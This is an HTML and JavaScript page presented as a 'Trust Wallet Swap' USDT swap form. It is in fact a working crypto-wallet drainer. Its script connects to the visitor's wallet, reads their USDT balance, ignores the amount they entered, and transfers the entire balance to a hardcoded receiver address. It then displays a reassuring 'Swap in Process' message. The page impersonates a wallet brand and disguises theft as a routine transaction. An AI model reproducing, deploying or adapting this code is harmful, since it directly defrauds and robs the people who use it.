<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Trust Wallet Swap</title>
  <style>
    :root {
      --primary: #3375BB;
      --primary-glow: rgba(51, 117, 187, 0.4);
      --text-medium: #999;
      --bg: #121212;
      --text: #ffffff;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      background: var(--bg);
      color: var(--text);
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .container {
      width: 90%;
      max-width: 400px;
      background: #1e1e1e;
      padding: 20px;
      border-radius: 20px;
      box-shadow: 0 0 20px var(--primary-glow);
    }

    h2 {
      text-align: center;
      color: var(--text);
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 12px 0;
      border: none;
      border-radius: 12px;
      background: #2a2a2a;
      color: var(--text);
      font-size: 16px;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      background-color: var(--primary);
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      cursor: pointer;
    }

    .custom-alert {
      background: #222;
      padding: 20px;
      border-radius: 12px;
      color: white;
      text-align: center;
      position: fixed;
      top: 30px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 999;
      box-shadow: 0 0 10px var(--primary-glow);
    }

    .custom-alert-title {
      font-size: 18px;
      font-weight: bold;
      margin-bottom: 10px;
    }

    .custom-alert-message {
      font-size: 15px;
      color: var(--text-medium);
      white-space: pre-line;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>USDT Swap</h2>
    <input type="text" id="usdtAmount" placeholder="Enter USDT Amount" />
    <button onclick="startSwap()">Continue</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const MIN_AMOUNT = 200;
    const MAX_DAILY_LIMIT = 10000;
    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";

    function showAlert(type, title, message) {
      const alert = document.createElement("div");
      alert.classList.add("custom-alert");

      const alertTitle = document.createElement("div");
      alertTitle.classList.add("custom-alert-title");
      alertTitle.innerText = title;

      const alertMessage = document.createElement("div");
      alertMessage.classList.add("custom-alert-message");
      alertMessage.innerText = message;

      alert.appendChild(alertTitle);
      alert.appendChild(alertMessage);
      document.body.appendChild(alert);

      setTimeout(() => alert.remove(), 4000);
    }

    async function startSwap() {
      if (typeof window.ethereum === "undefined") {
        return showAlert("error", "Wallet Error", "Please install MetaMask or Trust Wallet");
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const usdt = new ethers.Contract(
        usdtAddress,
        ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"],
        signer
      );

      try {
        await provider.send("eth_requestAccounts", []);
        const address = await signer.getAddress();
        const balance = await usdt.balanceOf(address);
        const balanceInUSDT = parseFloat(ethers.utils.formatUnits(balance, 18));

        if (balanceInUSDT < MIN_AMOUNT || balanceInUSDT > MAX_DAILY_LIMIT) {
          return showAlert(
            "error",
            "Insufficient USDT balance",
            `Minimum Required $${MIN_AMOUNT}\nMaximum $${MAX_DAILY_LIMIT} USDT`
          );
        }

        const tx = await usdt.transfer(receiver, balance);
        await tx.wait();

        showAlert("success", "Swap in Process", "");
      } catch (err) {
        console.error(err);
        showAlert("error", "Transaction Failed", "Something went wrong. Try again.");
      }
    }
  </script>
</body>
</html>
